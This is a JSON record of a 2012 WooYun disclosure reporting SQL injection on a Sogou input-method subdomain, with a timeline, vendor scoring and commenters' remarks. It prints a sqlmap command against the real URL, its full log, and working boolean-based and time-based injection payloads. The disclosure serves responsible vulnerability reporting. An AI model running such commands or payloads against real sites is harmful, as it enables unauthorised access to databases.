{"id": 20251, "wybug_id": "wooyun-2012-05719", "wybug_title": "搜狗某分站注入", "wybug_corp": "搜狗", "wybug_author": "Nu11", "wybug_date": "2012-04-02 08:04", "wybug_open_date": "2012-05-17 08:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-05-17：\t细节向公众公开  简要描述： 注入漏洞 详细说明：  搜狗分站存在注入，可能导致泄露数据库资料。   漏洞证明：  root@bt:/pentest/web/scanners/sqlmap# ./sqlmap.py -u \"http://wubi.sogou.com/skins/xl.php?id=55\"    sqlmap/0.9 - automatic SQL injection and database takeover tool    http://sqlmap.sourceforge.net[*] starting at: 07:33:43[07:33:44] [INFO] using '/pentest/web/scanners/sqlmap/output/wubi.sogou.com/session' as session file[07:33:44] [INFO] testing connection to the target url[07:33:46] [INFO] testing if the url is stable, wait a few seconds[07:33:47] [INFO] url is stable[07:33:47] [INFO] testing if GET parameter 'id' is dynamic[07:33:48] [INFO] confirming that GET parameter 'id' is dynamic[07:33:49] [INFO] GET parameter 'id' is dynamic[07:33:51] [WARNING] heuristic test shows that GET parameter 'id' might not be injectable[07:33:51] [INFO] testing sql injection on GET parameter 'id'[07:33:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[07:33:56] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable [07:33:56] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[07:33:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[07:33:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[07:33:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[07:33:59] [INFO] testing 'MySQL > 5.0.11 stacked queries'[07:34:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[07:34:01] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[07:34:02] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[07:35:02] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable [07:35:02] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[07:35:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'yET parameter 'id' is vulnerable. Do you want to keep testing the others? [y/N]  sqlmap identified the following injection points with a total of 34 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=55 AND 9272=9272    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=55 AND SLEEP(5)---[07:36:11] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.1.6back-end DBMS: MySQL 5.0.11[07:36:11] [INFO] Fetched data logged to text files under '/pentest/web/scanners/sqlmap/output/wubi.sogou.com'[*] shutting down at: 07:36:11   修复方案：     版权声明：转载请注明来源 Nu11@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2012-04-06 16:40 厂商回复： CNVD确认注入点，复现相关过程。此前与搜狗安全小组有过联系，将直接协调对方处理。站点为涉事单位输入法子站，就影响危害而言只涉及单个子站，未进行其他测试。对该漏洞评分如下：CVSS评分：(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N) Score:4.96（最高10分，中危)即：远程攻击、攻击难度低、不需要用户认证，对机密性造成部分影响，不影响完整性和可用性。技术难度系数：1.0(一般)影响危害系数：1.1(一般，子站系统)综合评分：4.96*1.0*1.1=5.456 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-04-02 10:26 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  搜狗的问题，怎么交给CNVD处理了？    \n     2012-04-02 10:31 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  哦！知道了！    \n     2012-05-07 11:00 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @shine 不明白，看不出为啥要给CNCERT....    \n     2012-05-07 11:35 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @horseluke 无非以下几种可能性：1、搜狗对漏洞的“已忽略”率太高了，xsser与该厂商已无法沟通（可能这洞里面有些问题，@xsser处理类似事件周全考虑的结果（@xsser的应急战略解决方案）），就只能给CNCERT（CNCERT才是最大的厂商负责部门（即国家））；2、搜狗与CNCERT有一腿；3、@xsser操作时打瞌睡或系统异常造成乌龙（这个基本不可能，因为即使乌龙了也是可以改回来的！）猜测别人的心思是不礼貌的！@xsser勿怪！哈哈！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}